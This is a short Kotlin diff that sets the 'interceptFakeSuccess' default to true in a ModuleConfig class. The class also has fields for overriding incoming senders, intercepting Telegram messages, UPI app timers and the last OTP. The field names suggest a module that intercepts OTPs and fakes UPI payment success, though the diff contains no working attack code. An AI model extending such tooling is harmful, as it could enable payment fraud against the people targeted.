@@ -37,7 +37,7 @@ data class ModuleConfig(
     val upiAppTimerBonuses: Map<String, Int> = UpiAppRegistry.defaultTimerMap(),
     val overrideIncomingSender: Boolean = true,
     val fakeInterceptTelegram: Boolean = true,
-    val interceptFakeSuccess: Boolean = false
+    val interceptFakeSuccess: Boolean = true,
 )
 
 data class LastOtp(
